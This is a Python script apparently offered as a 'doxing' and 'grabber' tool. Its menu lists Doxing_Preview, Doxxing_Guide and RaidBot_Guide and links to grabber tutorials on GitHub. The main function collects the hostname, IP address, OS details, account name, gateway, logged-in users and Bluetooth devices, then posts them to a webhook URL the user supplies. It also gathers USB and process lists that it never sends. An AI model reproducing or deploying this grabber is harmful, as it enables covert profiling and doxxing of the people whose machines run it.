import os
import ctypes
import socket
import requests
import platform
import getpass
import subprocess
from bs4 import BeautifulSoup
import re
import psutil

# Global variables
current_color = "5"
menu_options = [
    "+==========================================+",
    "+ 1- Doxing_Preview      6-Test            +",
    "+ 2- Doxxing_Guide       7-Test            +",
    "+ 3- RaidBot_Guide       8- Test           +",
    "+ 4- Test                9- Test           +",
    "+ 5- Test                10- Test          +",
    "+==========================================+",
]

def print_art():
    print("   ▄▀▀▄ ▀▀▄  ▄▀▀▄ ▀▄  ▄▀▀█▄▄  ")
    print("  █   ▀▄ ▄▀ █  █ █ █ ▐ ▄▀   █ ")
    print("  ▐     █   ▐  █  ▀█   █▄▄▄▀  ")
    print("        █     █   █    █   █  ")
    print("      ▄▀    ▄▀   █    ▄▀▄▄▄▀  ")
    print("      █     █    ▐   █    ▐   ")
    print("      ▐     ▐        ▐        ")

def print_menu():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
    os.system(f"color {current_color}")  # Set text color for Windows
    print_art()
    print("\n".join(menu_options))
    print("Choose (enter 0 to exit):")

def set_console_size():
    if os.name == 'nt':  # Check if the operating system is Windows
        try:
            os.system('mode con: cols=120 lines=40')  # Adjust these values as needed
        except Exception as e:
            print(f"Error adjusting console size: {e}")
    else:
        print("resizing not supported")

def Doxing_Preview():
    webhook = input("Enter your webhook URL: ").strip()
    send_to_webhook(webhook)

def Doxxing_Guide():
    custom_message = "https://github.com/yanibornea/YNBgrabber/new/main"
    print(f"{custom_message}")

def RaidBot_Guide():
    custom_message = "https://github.com/yanibornea/YNBgrabber/blob/main/GRABBERtutorial"
    print(custom_message)

def send_to_webhook(webhook):
    hostname = socket.gethostname()
    pc_name = hostname
    myip = socket.gethostbyname(hostname)
    system_info = get_system_info()
    main_browser = get_main_browser()
    account_name = get_account_name()
    default_gateway = get_default_gateway()
    device_type = get_device_type(default_gateway)
    logged_in_users = get_logged_in_users()
    performance_info = get_performance_info()
    bluetooth_devices = get_bluetooth_devices()
    usb_devices = get_usb_devices()
    running_apps = get_running_apps()

    webhook_url = webhook
    data = {
        "content": f"PC Name: {pc_name}\nIP Address: {myip}\nSystem Info: {system_info}\nMain Browser: {main_browser}\nAccount Name: {account_name}\nDefault Gateway: {default_gateway}\nDevice Type: {device_type}\nLogged-in Users: {logged_in_users}\nPerformance Info: {performance_info}\nBluetooth Devices: {bluetooth_devices}"
    }
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Data sent successfully to webhook.")
        else:
            print(f"Failed to send data to webhook. Status code: {response.status_code}")
            print("Response content:", response.content)
    except Exception as e:
        print(f"An error occurred: {e}")

def get_system_info():
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor()
    }
    return system_info

def get_main_browser():
    if platform.system() == "Windows":
        browsers = [
            {"name": "Chrome", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
            {"name": "Firefox", "path": "C:\\Program Files\\Mozilla Firefox\\firefox.exe"},
            {"name": "Edge", "path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"},
        ]
    elif platform.system() == "Darwin":  # macOS
        browsers = [
            {"name": "Safari", "path": "/Applications/Safari.app/Contents/MacOS/Safari"},
            {"name": "Chrome", "path": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"},
            {"name": "Firefox", "path": "/Applications/Firefox.app/Contents/MacOS/firefox"},
        ]
    else:  # Linux
        browsers = [
            {"name": "Chrome", "path": "/usr/bin/google-chrome"},
            {"name": "Firefox", "path": "/usr/bin/firefox"},
            {"name": "Chromium", "path": "/usr/bin/chromium-browser"},
        ]

    for browser in browsers:
        if os.path.exists(browser["path"]):
            return browser["name"]

    return "Unknown"

def get_account_name():
    if platform.system() == "Windows":
        return getpass.getuser()
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        return os.getenv("USER")
    else:
        return "Unknown"

def get_default_gateway():
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output("ipconfig", shell=True).decode()
            lines = output.split('\n')
            for line in lines:
                if "Default Gateway" in line:
                    return line.split(":")[1].strip()
        else:
            output = subprocess.check_output("ip route show | grep default", shell=True).decode()
            return output.split(" ")[2].strip()
    except Exception as e:
        print(f"Error while retrieving default gateway: {e}")
        return "Unknown"

def get_device_type(default_gateway):
    if default_gateway.startswith("192.168."):
        return "Router"
    elif default_gateway.startswith("10."):
        return "Router"
    elif default_gateway.startswith("172."):
        return "Router"
    else:
        return "Unknown"

def get_logged_in_users():
    try:
        users = []
        for user in psutil.users():
            users.append({"username": user.name, "terminal": user.terminal})
        print("Logging in:",)
        return users
    except Exception as e:
        print(f"Error while grabbing logged-in users: {e}")
        return []

def get_performance_info():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    return {
        "CPU Usage (%)": cpu_usage,
        "Memory Usage (%)": memory_usage,
        "Disk Usage (%)": disk_usage
    }

def get_bluetooth_devices():
    devices = []
    if platform.system() == "Linux":
        try:
            output = subprocess.check_output("hcitool scan", shell=True).decode()
            lines = output.strip().split("\n")
            for line in lines[1:]:
                parts = line.split("\t")
                if len(parts) == 2:
                    devices.append({"name": parts[1], "mac_address": parts[0]})
        except Exception as e:
            print(f"Error while retrieving Bluetooth devices: {e}")
    elif platform.system() == "Darwin":
        try:
            output = subprocess.check_output("system_profiler SPBluetoothDataType", shell=True).decode()
            sections = output.split("Devices:")
            if len(sections) > 1:
                devices_section = sections[1]
                lines = devices_section.strip().split("\n")
                for line in lines:
                    if "Address:" in line:
                        mac_address = line.split("Address:")[1].strip()
                    elif "Product ID:" in line:
                        name = line.split("Product ID:")[1].strip()
                        devices.append({"name": name, "mac_address": mac_address})
        except Exception as e:
            print(f"Error while grabbing Bluetooth devices: {e}")
    return devices

def get_usb_devices():
    usb_devices = []
    try:
        if platform.system() == "Linux":
            output = subprocess.check_output("lsusb", shell=True).decode()
            lines = output.strip().split("\n")
            for line in lines:
                parts = line.split(" ")
                vendor_id, product_id = parts[5].split(":") if len(parts) > 5 else ("", "")
                manufacturer = " ".join(parts[6:8]) if len(parts) > 7 else ""
                product = " ".join(parts[8:]) if len(parts) > 8 else ""
                usb_devices.append({
                    "vendor_id": vendor_id,
                    "product_id": product_id,
                    "manufacturer": manufacturer,
                    "product": product
                })
        elif platform.system() == "Windows":
            output = subprocess.check_output("wmic path Win32_PnPEntity where \"Caption like '%USB%'\" get /value", shell=True).decode()
            devices_info = output.strip().split("\n\n")
            for device_info in devices_info:
                device = {}
                for line in device_info.split("\n"):
                    key_value = line.split("=", 1)
                    if len(key_value) == 2:
                        key, value = key_value
                        device[key.strip()] = value.strip()
                if 'DeviceID' in device:
                    device_id_parts = device['DeviceID'].split("\\")
                    for part in device_id_parts:
                        if 'VID' in part:
                            vendor_id = part.split("_")[1]
                            device['vendor_id'] = vendor_id
                        elif 'PID' in part:
                            product_id = part.split("_")[1]
                            device['product_id'] = product_id
                usb_devices.append(device)
    except Exception as e:
        print(f"Error while grabbing USB devices: {e}")
    return usb_devices

def get_running_apps():
    running_apps = []
    try:
        for process in psutil.process_iter(['pid', 'name', 'username', 'exe']):
            if process.info['username'] and process.info['exe']:
                running_apps.append(process.info['name'])
    except Exception as e:
        print(f"Error while grabbing running apps: {e}")
    return running_apps

def main():
    set_console_size()
    while True:
        print_menu()
        try:
            choice = int(input("Choose 1-10 or 0 to exit: "))
            if choice == 0:
                print("Exiting...")
                break
            elif choice == 1:
                Doxing_Preview()  # 1st option
            elif choice == 2:
                Doxxing_Guide()  # 2nd option
            elif choice == 3:
                RaidBot_Guide()  # option 3
            elif choice in range(4, 6):
                print(f"You chose option {choice}")
            else:
                print("Invalid choice, please select a valid option.")
        except ValueError:
            print("Invalid input, please enter a number.")
        input("Press Enter to continue...")  # Pause to allow the user to read the message

if __name__ == "__main__":
    main()
